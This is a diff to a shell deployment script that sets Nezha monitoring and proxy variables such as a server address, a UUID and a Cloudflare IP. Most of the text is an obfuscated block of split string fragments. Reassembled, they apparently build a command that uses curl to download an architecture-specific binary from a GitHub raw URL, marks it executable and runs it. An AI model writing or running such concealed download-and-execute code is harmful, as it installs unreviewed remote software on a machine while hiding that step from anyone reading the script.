@@ -1,4 +1,4 @@
-#!/usr/bin/env bash
+#!/bin/sh
 
 export NEZHA_SERVER=${NEZHA_SERVER:-''}
 export NEZHA_PORT=${NEZHA_PORT:-''}
@@ -12,7 +12,6 @@ export UUID=${UUID:-'de04add9-5c68-8bab-950c-08cd5320df18'}
 export CFIP=${CFIP:-'icook.hk'}
 export NAME=${NAME:-''}
 export SERVER_PORT="${SERVER_PORT:-${PORT:-3000}}"
-export port1=${port1:-'8080'}
 
 z="
 ";iz='1="h';iBz='sts,';Dz='0m"';tz='/sta';jz='ttps';dBz='art ';Ez='BOLD';RBz='ure:';CBz='4" ]';WCz='rm64';iCz='load';cCz='dy e';kCz='}Run';hBz=' exi';VBz='exit';tBz=' sta';nBz='ad."';Iz='RED=';wz=' [ "';kz='://g';NBz='port';Rz='[33m';OBz='ed a';TCz='in/r';fCz='kipp';pz='ne/t';uBz='rt f';cBz=' "st';nCz='{RES';YBz='star';mBz='wnlo';uCz=' fil';Oz='YELL';Zz='RCH"';jCz='."';Lz='GREE';Mz='N="\';Hz='m"';GCz='ted.';UCz='un"';lz='ithu';mCz='...$';QCz='e/mj';wCz='" -o';OCz='/mjj';RCz='j/ra';Az='RESE';Qz='\033';VCz='un-a';sCz='./ru';DCz='art';HBz='else';WBz=' 1';Sz='"';SBz=' $AR';qCz='d 75';ICz='SET}';FCz='mple';eBz='file';oCz='ET}"';wBz='..${';vCz='e...';PCz='onon';BBz='rch6';fBz=' alr';az=' = "';cz='64" ';Vz='name';JBz=' -e ';HCz='${RE';ECz='d co';XCz='run ';kBz='ppin';qBz='}Dow';Wz=' -m)';pBz='REEN';Fz='="\0';ZBz='t ];';lBz='g do';gz='LOAD';Bz='T="\';Tz='ARCH';aCz='le a';yBz=' -sS';bCz='lrea';yz='H" =';QBz='tect';nz='m/mj';rCz='5 ru';MCz='thub';LBz='ED}U';Kz='3[31';IBz='echo';aBz=' the';UBz='T}"';gCz='ing ';mz='b.co';rz='raw/';bz='x86_';jBz=' ski';vz='elif';xz='$ARC';EBz='en';bBz='n';ABz=' "aa';dCz='xist';tCz=' run';hCz='down';PBz='rchi';Nz='32m"';Jz='"\03';KCz='tps:';ez='hen';YCz=' "ru';TBz='CH${';Xz='if [';JCz='="ht';dz=']; t';oBz='"${G';hz='_URL';GBz='rm"';pCz='chmo';MBz='nsup';Gz='33[1';Cz='033[';Yz=' "$A';SCz='w/ma';FBz='rt-a';uz='rt"';eCz='s, s';NCz='.com';fz='DOWN';xBz='curl';CCz='o st';Uz='=$(u';ACz='L "$';XBz='fi';oz='jono';rBz='nloa';DBz='; th';BCz='1" -';sz='main';Pz='OW="';lCz='ning';qz='est/';LCz='//gi';sBz='ding';gBz='eady';KBz='"${R';vBz='ile.';ZCz='n fi';
